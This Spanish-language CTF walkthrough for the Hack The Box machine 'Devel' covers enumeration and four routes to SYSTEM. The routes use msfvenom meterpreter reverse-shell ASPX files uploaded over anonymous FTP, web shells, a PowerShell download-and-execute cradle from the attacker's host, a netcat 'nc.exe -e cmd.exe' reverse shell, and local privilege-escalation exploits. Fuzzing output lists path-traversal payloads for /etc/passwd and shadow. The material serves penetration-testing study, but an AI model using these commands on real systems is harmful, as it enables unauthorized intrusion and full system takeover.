@@ -1,0 +1,703 @@
+	DEVEL	10.10.10.5
+
++++++ INFORMACION ENTREGADA:++++++++++++++++++++++++++++++++++++++++++++++++++++
+	Nombre: Devel
+	Sistema Operativo: Windows
+	Dificultad: Facil.
+	IP: 10.10.10.5
+
+
++++++ RECOLECION DE INFORMACION: ++++++++++++++++++++++++++++++++++++++++++++++++
+
+-- PUERTOS:
+
+	nmap -p- -Pn 10.10.10.5
+
+	nmap -sC -sV -O -p21,80 10.10.10.5 -o nmapTCP.txt
+
+	PORT   STATE SERVICE VERSION
+	21/tcp open  ftp     Microsoft ftpd
+	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+	| 03-18-17  01:06AM       <DIR>          aspnet_client
+	| 03-17-17  04:37PM                  689 iisstart.htm
+	|_03-17-17  04:37PM               184946 welcome.png
+	| ftp-syst:
+	|_  SYST: Windows_NT
+
+	80/tcp open  http    Microsoft IIS httpd 7.5
+	| http-methods:
+	|_  Potentially risky methods: TRACE
+	|_http-server-header: Microsoft-IIS/7.5
+	|_http-title: IIS7
+	Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+	Device type: general purpose|phone|specialized
+	Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
+	OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012:r2
+	Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
+	No exact OS matches for host (test conditions non-ideal).
+	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+	nmap -sU 10.10.10.5 -o nmapUDP.txt
+
+	No hay puertos UDP abiertos.
+
+----- RESUMEN DE LA INFORMACION OBTENIDA:---------------------------------------
+
+	Puerto 21	Protocolo:TCP	Servicio:ftp	Version: Microsoft ftpd
+	Puerto 80	Protocolo:TCP	Servicio:html	Version: Microsoft IIS httpd 7.5  x-aspnet-version header: 2.0.50727
+
+
++++++ FASE DE ANALISIS DE VULNERAVILIDADES: ++++++++++++++++++++++++++++++++++++
+
+----- FTP: Conexion ftp por el puerto 21 -----
+
+	*Prueba de acceso con usuarios anonymous y nada en password.
+	Se consigue acceso y muestra solo los siguientes ficheros/directorio.
+
+	| 03-18-17  01:06AM       <DIR>          aspnet_client
+	| 03-17-17  04:37PM                  689 iisstart.htm
+	|_03-17-17  04:37PM               184946 welcome.png
+	
+	*Nota con esta opcion podemos subir o bajar archivos.
+
+-- Ejecutar SCRIPT de la herramienta Nmap: 
+
+	nmap --script=*ftp* -p21 10.10.10.5 (Tarda varios minutos, ya que incluye un script de fuerza bruta).
+	
+	Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 10:25 EDT
+	NSE: [ftp-bounce] PORT response: 501 Server cannot accept argument.
+	NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
+	NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
+	NSE: [ftp-brute] passwords: Time limit 10m00s exceeded.
+	Nmap scan report for 10.10.10.5
+	Host is up (0.044s latency).
+
+	PORT   STATE SERVICE
+	21/tcp open  ftp
+	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+	| 03-18-17  02:06AM       <DIR>          aspnet_client
+	| 03-17-17  05:37PM                  689 iisstart.htm
+	|_03-17-17  05:37PM               184946 welcome.png
+	| ftp-brute: 
+	|   Accounts: No valid accounts found
+	|_  Statistics: Performed 39531 guesses in 600 seconds, average tps: 66.1
+	| ftp-syst: 
+	|_  SYST: Windows_NT
+
+	Nmap done: 1 IP address (1 host up) scanned in 600.37 seconds
+
+
+----- HTTP: Conexion http por el puerto 80 -----
+
+-- Ejecuto la aplicación NIKTO, por el puerto 80.
+
+	nikto -h 10.10.10.5 -p80 >nikto.txt
+
+	- Nikto v2.1.6
+	---------------------------------------------------------------------------
+	+ Target IP:          10.10.10.5
+	+ Target Hostname:    10.10.10.5
+	+ Target Port:        80
+	+ Start Time:         2020-03-01 05:40:29 (GMT-5)
+	---------------------------------------------------------------------------
+	+ Server: Microsoft-IIS/7.5
+	+ Retrieved x-powered-by header: ASP.NET
+	+ The anti-clickjacking X-Frame-Options header is not present.
+	+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+	+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+	+ Retrieved x-aspnet-version header: 2.0.50727
+	+ No CGI Directories found (use '-C all' to force check all possible dirs)
+	+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+	+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+	+ /: Appears to be a default IIS 7 install.
+	+ 7863 requests: 0 error(s) and 8 item(s) reported on remote host
+	+ End Time:           2020-03-01 05:46:12 (GMT-5) (343 seconds)
+	---------------------------------------------------------------------------
+	+ 1 host(s) tested
+
+-- Buscar con searchsploit "IIS 7.5" 
+	# searchsploit IIS 7.5
+
+	Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                       | exploits/windows/remote/19033.txt
+	Microsoft IIS 7.5 (Windows 7) - FTPSVC Unauthorized Remote Denial of Service ( | exploits/windows/dos/15803.py
+
+
+-- Con Wfuzz probar dando la siguiente informacion.
+
+	wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/All_attack.txt --hc 404 http://10.10.10.5/FUZZ > wfuzz-ALL_attack.txt
+
+	********************************************************
+	* Wfuzz 2.4.5 - The Web Fuzzer                         *
+	********************************************************
+
+	Target: http://10.10.10.5/FUZZ
+	Total requests: 468
+
+	===================================================================
+	ID           Response   Lines    Word     Chars       Payload                                           
+	===================================================================
+
+	000000022:   400        6 L      26 W     324 Ch      "<  script > < / script>"                         
+	000000023:   400        6 L      26 W     324 Ch      "%0a"                                             
+	000000024:   400        6 L      26 W     324 Ch      "%00"                                             
+	000000025:   400        6 L      26 W     324 Ch      "+%00"                                            
+	000000039:   400        6 L      26 W     324 Ch      "\nnetstat -a%\n"                                 
+	000000043:   400        6 L      26 W     324 Ch      "id%00"                                           
+	000000040:   400        6 L      26 W     324 Ch      "\"blah"                                          
+	000000044:   400        6 L      26 W     324 Ch      "id%00|"                                          
+	000000056:   200        31 L     53 W     689 Ch      "?x=|"                                            
+	000000057:   200        31 L     53 W     689 Ch      "?x=>"                                            
+	000000054:   200        31 L     53 W     689 Ch      "?x="                                             
+	000000055:   200        31 L     53 W     689 Ch      "?x=""                                            
+	000000062:   400        6 L      26 W     324 Ch      "ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|"
+	000000063:   403        6 L      22 W     312 Ch      "../../../../../../../../../../../../etc/hosts%00"
+	000000064:   403        6 L      22 W     312 Ch      "../../../../../../../../../../../../etc/hosts"   
+	000000065:   403        6 L      22 W     312 Ch      "../../boot.ini"                                  
+	000000066:   403        6 L      22 W     312 Ch      "/../../../../../../../../%2A"                    
+	000000067:   403        6 L      22 W     312 Ch      "../../../../../../../../../../../../etc/passwd%00"
+	000000068:   403        6 L      22 W     312 Ch      "../../../../../../../../../../../../etc/passwd"  
+	000000069:   403        6 L      22 W     312 Ch      "../../../../../../../../../../../../etc/shadow%00"
+	000000070:   403        6 L      22 W     312 Ch      "../../../../../../../../../../../../etc/shadow"  
+	000000071:   403        6 L      22 W     312 Ch      "/../../../../../../../../../../etc/passwd^^"     
+	000000072:   403        6 L      22 W     312 Ch      "/../../../../../../../../../../etc/shadow^^"     
+	000000073:   403        6 L      22 W     312 Ch      "/../../../../../../../../../../etc/passwd"       
+	000000074:   403        6 L      22 W     312 Ch      "/../../../../../../../../../../etc/shadow"       
+	000000077:   403        6 L      22 W     312 Ch      "\..\..\..\..\..\..\..\..\..\..\etc\passwd"       
+	000000078:   403        6 L      22 W     312 Ch      "\..\..\..\..\..\..\..\..\..\..\etc\shadow"       
+	000000079:   403        6 L      22 W     312 Ch      "..\..\..\..\..\..\..\..\..\..\etc\passwd"        
+	000000080:   403        6 L      22 W     312 Ch      "..\..\..\..\..\..\..\..\..\..\etc\shadow"        
+	000000081:   403        6 L      22 W     312 Ch      "/..\../..\../..\../..\../..\../..\../etc/passwd" 
+	000000085:   403        6 L      22 W     312 Ch      "\..\..\..\..\..\..\..\..\..\..\etc\passwd%00"    
+	000000086:   403        6 L      22 W     312 Ch      "\..\..\..\..\..\..\..\..\..\..\etc\shadow%00"    
+	000000082:   403        6 L      22 W     312 Ch      "/..\../..\../..\../..\../..\../..\../etc/shadow" 
+	000000087:   403        6 L      22 W     312 Ch      "..\..\..\..\..\..\..\..\..\..\etc\passwd%00"     
+	000000088:   403        6 L      22 W     312 Ch      "..\..\..\..\..\..\..\..\..\..\etc\shadow%00"     
+	000000089:   400        6 L      26 W     324 Ch      "%0a/bin/cat%20/etc/passwd"                       
+	000000090:   400        6 L      26 W     324 Ch      "%0a/bin/cat%20/etc/shadow"                       
+	000000091:   400        6 L      26 W     324 Ch      "%00/etc/passwd%00"                               
+	000000095:   403        6 L      22 W     312 Ch      "/../../../../../../../../../../../etc/passwd%00.jpg"                                                                                                 
+	000000096:   403        6 L      22 W     312 Ch      "/../../../../../../../../../../../etc/passwd%00.html"                                             
+	000000092:   400        6 L      26 W     324 Ch      "%00/etc/shadow%00"                               
+	000000093:   400        6 L      26 W     324 Ch      "%00../../../../../../etc/passwd"                 
+
+	Fatal exception: Pycurl error 3: 
+
+-- Buscar directorios con la aplicación dirb:
+	dirb http://10.10.10.5
+	
+	http://10.10.10.5/aspnet_client/ 
+	http://10.10.10.5/aspnet_client/system_web/
+	http://10.10.10.5/aspnet_client/system_web/jar 
+	http://10.10.10.5/aspnet_client/system_web/2_0_50727/	
+	
+
+
++++++ FASE DE EXPLOTACION ++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+//////////////////////////// OPCION 1 ////////////////////////////////////////////
+
+	Crear un fichero en formato aspx ya que el servidor Devel el framework es ASP.NET en kali y al tener acceso por ftp intentar subir y funciona.
+
+	Intentar una shell reverse, creando un payload ejecutando:
+	msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.37 LPORT=4444 -f aspx -o shell.aspx
+
+	En la maquina Devel por acceso ftp 10.10.10.5.
+	User anonymous
+	password anonymous
+	Ejecutar
+	ftp> put shell.aspx
+
+	Se consigue subirla.
+
+	En Kali:
+	msf > use exploit/multi/handler
+	msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+	PAYLOAD => windows/meterpreter/reverse_tcp
+	msf exploit(handler) > set LHOST 10.10.14.37
+	msf exploit(handler) > set LPORT 4444
+	msf exploit(handler) > exploit
+
+	Ejecuto en la web:
+	http://10.10.10.5/shell.aspx
+
+	Nos abrira una consola de meterpreter sin ser root.
+	meterpreter > shell                                                                                                
+	Process 3952 created.                                                                                              
+	Channel 1 created.                                                                                                 
+	Microsoft Windows [Version 6.1.7600]                                                                               
+	Copyright (c) 2009 Microsoft Corporation.  All rights reserved.                                                    
+                                                                                                                   
+	c:\windows\system32\inetsrv>whoami                                                                                 
+	whoami                                                                                                             
+	iis apppool\web  
+	
+	c:\windows\system32\inetsrv>net user
+	net user
+
+	User accounts for \\
+
+	-------------------------------------------------------------------------------
+	Administrator            babis                    Guest                    
+	The command completed with one or more errors.
+
+                                                                                                                   
+	Hacer un background.
+	
+	Buscar mas informacion:
+	
+	meterpreter > sysinfo
+	Computer        : DEVEL
+	OS              : Windows 7 (6.1 Build 7600).
+	Architecture    : x86
+	System Language : el_GR
+	Domain          : HTB
+	Logged On Users : 0
+	Meterpreter     : x86/windows
+
+	
+	meterpreter > getsystem
+	[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
+	[-] Named Pipe Impersonation (In Memory/Admin)
+	[-] Named Pipe Impersonation (Dropper/Admin)
+	[-] Token Duplication (In Memory/Admin)
+
+	
+	Ejecutar para buscar " search suggester", para buscar posible vulnerabilidades.
+
+	use post/multi/recon/local_exploit_suggester 
+	set SESSION 1
+	exploit
+
+	SALDRÁ:
+
+	[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+	[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+	[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+	[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+	[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+	[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+	[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
+	[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+	[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+	[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+	[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
+	[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+
+	Se prueba uno a uno, hasta que salga una consola de root.
+	En este caso funciona con el exploit ms10_015_kitrap0d :
+
+	use exploit/windows/local/ms10_015_kitrap0d
+	msf5 exploit(windows/local/ms10_015_kitrap0d) > set LHOST 10.10.14.19
+	LHOST => 10.10.14.4
+	msf5 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 1
+	SESSION => 1
+	msf5 exploit(windows/local/ms10_015_kitrap0d) > exploit
+
+	meterpreter > getuid
+	Server username: NT AUTHORITY\SYSTEM
+	meterpreter > [*] 10.10.10.5 - Meterpreter session 2 closed.  Reason: Died
+
+	meterpreter > shell
+	Process 624 created.
+	Channel 1 created.
+	Microsoft Windows [Version 6.1.7600]
+	Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+	c:\windows\system32> getuid
+	Server username: NT AUTHORITY\SYSTEM
+	
+
+//////////////////////////// OPCION 2 ////////////////////////////////////////////		
+
+	Se crea un listener en el puerto e ip fijada de nuestro equipo y será gracias a que el puerto 80 está abierto. 
+	Nuestro .aspx será procesado en el servidor web y obtendremos lo que queremos ;)
+	
+	# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.37 LPORT=1234 -f aspx > user_backdoor.aspx
+		[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+		[-] No arch selected, selecting arch: x86 from the payload
+		No encoder or badchars specified, outputting raw payload
+		Payload size: 341 bytes
+		Final size of aspx file: 2788 bytes
+
+	
+	Subirmos el fichero creado por ftp.
+	# ftp 10.10.10.5
+		usuario: anonymous
+		password: (vacio-pulsar intro)
+	
+	put user_backdoor.aspx			
+	
+	Se confirma  que lo ha subido.
+	ftp> dir
+	200 PORT command successful.
+	125 Data connection already open; Transfer starting.
+	03-18-17  02:06AM       <DIR>          aspnet_client
+	03-17-17  05:37PM                  689 iisstart.htm
+	04-07-20  07:34PM                 2824 user_backdoor.aspx
+	03-17-17  05:37PM               184946 welcome.png
+
+		En Kali:
+	msf > use exploit/multi/handler
+	msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+	PAYLOAD => windows/meterpreter/reverse_tcp
+	msf exploit(handler) > set LHOST 10.10.14.37
+	msf exploit(handler) > set LPORT 1234
+	msf exploit(handler) > exploit
+	
+	En el navegador ejecutar el fichero subido.
+	ftp://10.10.10.5/
+	
+	Muestra ficheros, incluso el que subimos. Pulsar doble click.
+	En la consola de metasploit, se cpnsigue una consola de terminal. Ejecutar.
+	meterpreter > shell
+	
+	El acceso es como usuario, no como administador.
+	Ejecutar con comando ps
+	meterpreter > ps
+	
+Hacer un background.
+	Ejecutar para buscar " search suggester"
+
+	use post/multi/recon/local_exploit_suggester 
+	set SESSION 1
+	exploit
+
+	SALDRÁ:
+
+	[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+	[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+	[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+	[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+	[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+	[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+	[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
+	[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+	[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+	[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
+	[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
+	[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+
+	Ir probando uno a uno, hasta que salga una consola de root.
+	En este caso funciona con el exploit ms13_053_schlamperei :
+	msf5 exploit(windows/local/ms13_053_schlamperei) > set LHOST 10.10.14.37
+	LHOST => 10.10.14.4
+	msf5 exploit(windows/local/ms13_053_schlamperei) > set SESSION 1
+	SESSION => 1
+	msf5 exploit(windows/local/ms13_053_schlamperei) > exploit
+	[*] Started reverse TCP handler on 10.10.14.37:4444 
+	[*] Launching notepad to host the exploit...
+	[+] Process 3100 launched.
+	[*] Reflectively injecting the exploit DLL into 3100...
+	[*] Injecting exploit into 3100...
+	[*] Found winlogon.exe with PID 452
+	[+] Everything seems to have worked, cross your fingers and wait for a SYSTEM shell
+	[*] Sending stage (180291 bytes) to 10.10.10.5
+	[*] Meterpreter session 4 opened (10.10.14.37:4444 -> 10.10.10.5:49200) at 2020-04-04 12:01:24 -0400
+
+	meterpreter > getuid
+	Server username: NT AUTHORITY\SYSTEM
+	meterpreter > [*] 10.10.10.5 - Meterpreter session 2 closed.  Reason: Died
+
+	meterpreter > shell
+	Process 624 created.
+	Channel 1 created.
+	Microsoft Windows [Version 6.1.7600]
+	Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+	
+	Se consigue una consola como admisnistrador.
+	c:\windows\system32>
+	
+
+//////////////////////////// OPCION 3 ////////////////////////////////////////////	
+
+	Al tener acceso por el servicio de FTP con Usuario anonymous y password (vacio)
+	21/tcp open  ftp     Microsoft ftpd
+	| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+	
+	En el sistema operativo vienen unos ficheros de shell remoto, 
+	En /usr/share/davtest/backdoors/aspx_cmd.aspx
+	Copiar a nuestro directorio de Devel, para una mejor gestion.
+	
+	Realizamos la conexion FTP.
+	ftp > put aspx_cmd.aspx
+	ftp> dir
+	200 PORT command successful.
+	125 Data connection already open; Transfer starting.
+	03-18-17  02:06AM       <DIR>          aspnet_client
+	04-07-20  09:40PM                 1438 aspx_cmd.aspx
+	03-17-17  05:37PM                  689 iisstart.htm
+	03-17-17  05:37PM               184946 welcome.png
+
+	En un navegador escribir http://10.10.10.5/aspx_cmd.aspx
+	Muestra una ventana de comandos, probar:
+	whoami --> iis apppool\web		(usuario web limitado)
+	
+	No tenemos permisos, y se comienza la elevacion de privilegios.
+	Intentar conseguir una shell adminsrador con powershell.
+	
+	Probar con un framework llamado nishang.
+	Esta en la web: https://github.com/samratashok/nishang
+	Descargar el contenido en nuetro directorio Devel:
+	
+	wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 
+	
+	Editar el fichero descargado y en las ultima lineas especificar según el comentario de la web 
+	copiar Invoke-PowerShellTcp -Reverse -IPAddress [IP-de nuestro S.Operativo] -Port [PortNo. que queramos] y pegar al final del código
+	que es la función que realiza la reverse shell. Quedaria asi: 
+	Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.37 -Port 55555
+	
+	Copiar el contenido inicial de la línea anterior donde se copia el argumento, es decir:
+	powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');
+	y modificar por nuestro servidor web en python que lo creamos asi:
+	sudo python3 -m http.server 80
+	
+	En otra consola preparar la escucha, ejecutando: nc -lvnp 55555
+	
+	Ejecutar el comando en la ventana de la shell anterior (aspx_cmd.aspx):
+	powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.37/Invoke-PowerShellTcp.ps1')
+	
+	Se consigue una consola de terminal.
+	listening on [any] 55555 ...
+	connect to [10.10.14.37] from (UNKNOWN) [10.10.10.5] 49171
+	Windows PowerShell running as user DEVEL$ on DEVEL
+	Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+	PS C:\windows\system32\inetsrv>whoami
+	iis apppool\web
+	PS C:\windows\system32\inetsrv> 
+
+	Ok, seguir con el mismo usuario, lo único que se ha hecho es pasar de una shell a una powershell
+	
+-- Ahora denbemos elevar privilegios: --
+	Ejecutar systeminfo.
+	PS C:\windows\system32\inetsrv>systeminfo
+
+	Host Name:                 DEVEL
+	OS Name:                   Microsoft Windows 7 Enterprise 
+	OS Version:                6.1.7600 N/A Build 7600
+	OS Manufacturer:           Microsoft Corporation
+	OS Configuration:          Standalone Workstation
+	OS Build Type:             Multiprocessor Free
+	Registered Owner:          babis
+	Registered Organization:   
+	Product ID:                55041-051-0948536-86302
+	Original Install Date:     17/3/2017, 4:17:31 ??
+	System Boot Time:          7/4/2020, 7:59:34 ??
+	System Manufacturer:       VMware, Inc.
+	System Model:              VMware Virtual Platform
+	System Type:               X86-based PC
+	Processor(s):              1 Processor(s) Installed.
+                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+	BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+	Windows Directory:         C:\Windows
+	System Directory:          C:\Windows\system32
+	Boot Device:               \Device\HarddiskVolume1
+	System Locale:             el;Greek
+	Input Locale:              en-us;English (United States)
+	Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+	Total Physical Memory:     1.023 MB
+	Available Physical Memory: 681 MB
+	Virtual Memory: Max Size:  2.047 MB
+	Virtual Memory: Available: 1.484 MB
+	Virtual Memory: In Use:    563 MB
+	Page File Location(s):     C:\pagefile.sys
+	Domain:                    HTB
+	Logon Server:              N/A
+	Hotfix(s):                 N/A
+	Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.5
+
+	Con esto debemos enumerar información del sistema.
+	Debemos centrarnos en Hotfix, que son los parches de seguridad que se han instalado.
+	Como nos muestra nos hay ninguno, por lo que da una pista de que el equipo tenga vulnerabilidades.
+	Hotfix(s):   N/A
+	
+	Para buscar vulnerabilidades utilizar la herramienta Watson.
+	En la web: https://github.com/rasta-mouse/Watson
+	
+	Hay que compilarlo en Windows.
+	Descargar el repositorio, Compilar con Visual Studio.
+	Cargar el proyecto, ir a propiedades del proyecto.
+	En propiedades de plataforma de destino: seleccionar .NET Framework 3.5
+	En nuestro equipo comprobar que lo está instalado con el comando:
+	reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
+	
+	PS C:\windows\system32\inetsrv> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
+	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v2.0.50727
+	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.0
+	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v3.5
+	PS C:\windows\system32\inetsrv> 
+	* Muestra las versiones instaladas
+	* Por ello con Visual studio debe seleccionar: .NET Framework 3.5
+	
+	En compilar --> Administrador de configuracion, modificar:
+	- configuracion: Release.
+	- Plataforma , nueva. X86  (Lo pone con el comando systeminfo).
+	Compilamos en Compilar --> Compilar Watson.
+
+	Subimos el fichero lo realizamos con el script de phyton  smbserver.py
+	Para instalar smbserver.py, descargar desde https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbserver.py
+	Para instalar smbserver.py, descargar con wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/impacket/smbserver.py
+
+	Buscar en nuestro sistema operativo el fichero smbserver.py
+	locate smbserver.py
+	Estando en el directorio donde tenemos todos los ficheros que estamos subiendo.
+	cp /usr/share/doc/python3-impacket/examples/smbserver.py .
+	
+	Ejecutar el servidor smb. python3 /usr/share/doc/python3-impacket/examples/smbserver.py share .
+	
+	
+	en la consola powershell vamos al directorio cd c:\Windows\Temp
+	y subimos el fichero copy \\10.10.14.37\a\Watson.exe
+	lo ejecutamos Watson.exe
+	No muesta las vulnerabilidades:
+	watson.exe
+  __    __      _                   
+ / / /\ \ \__ _| |_ ___  ___  _ __  
+ \ \/  \/ / _` | __/ __|/ _ \| '_ \ 
+  \  /\  / (_| | |_\__ \ (_) | | | |
+   \/  \/ \__,_|\__|___/\___/|_| |_|
+                                   
+                           v0.1    
+                                   
+                  Sherlock sucks...
+                   @_RastaMouse
+
+	[*] OS Build number: 7600
+	[*] CPU Address Width: 32
+	[*] Process IntPtr Size: 4
+	[*] Using Windows path: C:\WINDOWS\System32
+
+	[*] Appears vulnerable to MS10-073
+	[>] Description: Kernel-mode drivers load unspecified keyboard layers improperly, which result in arbitrary code execution in the kernel.
+	[>] Exploit: https://www.exploit-db.com/exploits/36327/
+	[>] Notes: None.
+
+	[*] Appears vulnerable to MS10-092
+	[>] Description: When processing task files, the Windows Task Scheduler only uses a CRC32 checksum to validate that the file has not been tampered with.Also, In a default configuration, normal users can read and write the task files that they have created.By modifying the task file and creating a CRC32 collision, an attacker can execute arbitrary commands with SYSTEM privileges.
+	[>] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms10_092_schelevator.rb
+	[>] Notes: None.
+
+	[*] Appears vulnerable to MS11-046
+	[>] Description: The Ancillary Function Driver (AFD) in afd.sys does not properly validate user-mode input, which allows local users to elevate privileges.
+	[>] Exploit: https://www.exploit-db.com/exploits/40564/
+	[>] Notes: None.
+
+	[*] Appears vulnerable to MS12-042
+	[>] Description: An EoP exists due to the way the Windows User Mode Scheduler handles system requests, which can be exploited to execute arbitrary code in kernel mode.
+	[>] Exploit: https://www.exploit-db.com/exploits/20861/
+	[>] Notes: None.
+
+	[*] Appears vulnerable to MS13-005
+	[>] Description: Due to a problem with isolating window broadcast messages in the Windows kernel, an attacker can broadcast commands from a lower Integrity Level process to a higher Integrity Level process, thereby effecting a privilege escalation.
+	[>] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms13_005_hwnd_broadcast.rb
+	[>] Notes: None.
+
+	[*] Finished. Found 5 vulns :)
+	ERROR> The given key was not present in the dictionary.
+	ERROR> C:\WINDOWS\System32\win32kfull.sys
+	ERROR> C:\WINDOWS\System32\gdiplus.dll
+	ERROR> C:\WINDOWS\System32\coremessaging.dll
+
+	Dice que tiene la vulnerabilidad MS11-046.
+	
+	Ir al Exploit: https://www.exploit-db.com/exploits/40564
+	copiamos el raw.
+	Descargamos el fichero wget https://www.exploit-db.com/raw/40564 -O exploit.c
+	
+	Compilados con i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
+ 	* Si no tenemos el programa descargar apt-get install mingw-w64
+	
+	Con netcat desde Devel transferimos el fichero.
+		cp /usr/share/windows-binaries/nc.exe .
+	
+		Con FTP lo subimos.
+		put exploit.exe
+		
+		Volver a la consola de powershell y ejecutar.
+		PS C:\inetpub\wwwroot>.\nc.exe -e cmd.exe 10.10.14.37 4444 (queda a la escucha)
+		Desde una consola nuestra ejecutar:
+		nc -lvp 4444
+		Se consigue una consola.
+		Ejecutar exploit.exe
+		Se consigue una consola como admisnistrador.
+		c:\windows\system32>
+		
+
+	
+//////////////////////////// OPCION 4 ////////////////////////////////////////////
+
+	Para conseguir una shell, descargar de la web 
+	https://github.com/danielmiessler/SecLists/tree/master/Web-Shells/FuzzDB
+	los ficheros cmd.aspx y nc.exe 
+	wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Web-Shells/FuzzDB/cmd.aspx
+	wget https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/FuzzDB/nc.exe
+	
+	Realizar la conexion FTP.
+	ftp > put cmd.aspx
+	ftp> dir
+	200 PORT command successful.
+	125 Data connection already open; Transfer starting.
+	03-18-17  02:06AM       <DIR>          aspnet_client
+	04-07-20  09:40PM                 1438 cmd.aspx
+	03-17-17  05:37PM                  689 iisstart.htm
+	03-17-17  05:37PM               184946 welcome.png
+	
+	ftp > binary
+	ftp > put nc.exe
+
+	En un navegador escribir http://10.10.10.5/cmd.aspx
